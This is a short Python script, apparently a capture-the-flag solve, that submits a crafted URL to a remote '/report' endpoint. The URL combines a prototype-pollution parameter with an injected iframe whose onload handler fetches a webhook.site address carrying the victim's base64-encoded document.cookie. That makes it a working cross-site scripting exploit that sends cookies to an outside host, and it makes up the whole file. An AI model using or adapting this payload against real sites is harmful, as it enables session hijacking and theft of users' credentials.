import requests 

#url = "http://localhost:5000/report"
url = "http://34.134.162.213:17002/report"
payload="http://127.0.0.1:5000/?__proto__[*]=[%27onload%27]&note=%3Ciframe+onload=%22fetch(`https://webhook.site/ef0c35e5-4ab8-4993-84c7-f9167db5e213%3Fcookie%3D%24%7Bbtoa%28document.cookie%29%7D`)%22%3E%3C/iframe%3E"

data = {"url" : payload}

resp = requests.post(url, data=data)

print(resp.text)
